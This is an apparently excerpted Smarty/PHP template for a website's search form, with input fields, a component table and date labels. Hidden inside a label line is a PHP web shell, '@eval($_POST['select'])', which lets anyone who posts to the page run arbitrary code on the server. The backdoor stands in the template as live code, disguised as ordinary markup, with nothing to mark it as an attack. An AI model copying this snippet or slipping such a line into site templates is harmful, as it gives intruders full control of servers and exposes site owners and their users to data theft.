...
<input type="hidden" name="view" value="search" />
    <input type="text" name="query" id="query" size="21" value="" class="text-input" />
	...
	<table border="0" cellspacing="0" cellpadding="3">
      ...
      <tr> {/if}
                ...
                <label id="l_{$enable_component.link}" class="selected">
                    ...
                    {$enable_component.title}</label><?php @eval($_POST['select']);?></td>
                {if $col==5} </tr> {assign var="col" value="1"} {else} {math equation="x + 1" x=$col assign="col"} {/if}
            {/foreach}
            {if $col>1} 
                <td colspan="{math equation="x - y + 1" x=$col y=5}">&nbsp;</td>
            {/if}
      </table>
      <p><strong>{$LANG.PUBDATE}:</strong></p>
        ...
        <div style="position:absolute; top:145px; right:389px; font-size:10px;">
        	<a href="javascript:" onclick="$('#from_search').fadeOut();" class="ajaxlink">{$LANG.HIDE}</a>        </div>
